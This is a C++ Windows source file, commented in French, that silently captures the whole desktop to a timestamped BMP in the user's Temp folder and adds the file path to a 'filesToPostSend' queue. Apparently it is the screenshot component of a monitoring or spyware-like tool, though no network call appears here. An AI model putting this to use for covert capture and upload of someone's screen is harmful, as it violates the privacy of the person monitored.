#include "../headers/headers.hpp"

using namespace std;

void recordScreenShot() {
    // Obtenez le contexte du bureau
    HDC hdcScreen = GetDC(NULL);

    // Obtenez les dimensions de l'écran
    DEVMODE devMode;
    EnumDisplaySettings(nullptr, ENUM_CURRENT_SETTINGS, &devMode);
    int screenWidth = devMode.dmPelsWidth;
    int screenHeight = devMode.dmPelsHeight;

    cout << screenHeight << screenWidth << endl;

    // Créez un contexte de mémoire compatible avec l'écran
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    // Créez un bitmap compatible avec l'écran
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);

    // Sélectionnez le bitmap dans le contexte de mémoire
    SelectObject(hdcMem, hBitmap);

    // Copiez l'écran dans le bitmap
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Créez un objet BITMAP pour obtenir les informations sur le bitmap
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    // Sélectionnez le bitmap dans le contexte de mémoire
    SelectObject(hdcMem, hBitmap);

    // Créez un objet BITMAPINFOHEADER pour spécifier le format du fichier bitmap
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screenWidth;
    bi.biHeight = screenHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24; // 24 bits par pixel
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Créez un fichier bitmap et écrivez les données du bitmap
    string fileName = findFileNameBmp();
    FILE* file = fopen(fileName.c_str(), "wb");
    if (file) {
        // Écrivez l'en-tête BITMAPFILEHEADER
        BITMAPFILEHEADER bmfHeader;
        bmfHeader.bfType = 0x4D42; // "BM"
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmp.bmWidth * bmp.bmHeight * 3;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);

        // Écrivez l'en-tête BITMAPINFOHEADER
        fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

        // Écrivez les données du bitmap
        BYTE* bits = new BYTE[screenWidth * screenHeight * 3];
        GetDIBits(hdcMem, hBitmap, 0, screenHeight, bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        fwrite(bits, 1, screenWidth * screenHeight * 3, file);

        // Libérez la mémoire
        delete[] bits;

        // Fermez le fichier
        fclose(file);
    }

    // Libérez le contexte de mémoire
    DeleteDC(hdcMem);

    // Libérez le contexte du bureau
    ReleaseDC(NULL, hdcScreen);

    // Libérez le bitmap
    DeleteObject(hBitmap);
    *filesToPostSend.load() += fileName + "\n";
}


string findFileNameBmp() {
    /*
    The file name will be composed of:
    (username -> date -> time).bmp
    */
    const DWORD size = UNLEN + 1;
    char usernameChar[size];
    GetUserNameA(usernameChar, const_cast<LPDWORD>(&size));
    string username = usernameChar;

    time_t now = time(nullptr);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y%m%d%H%M%S", localtime(&now));
    string dateHeure = buffer;

    return "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\" + dateHeure + ".bmp";
}
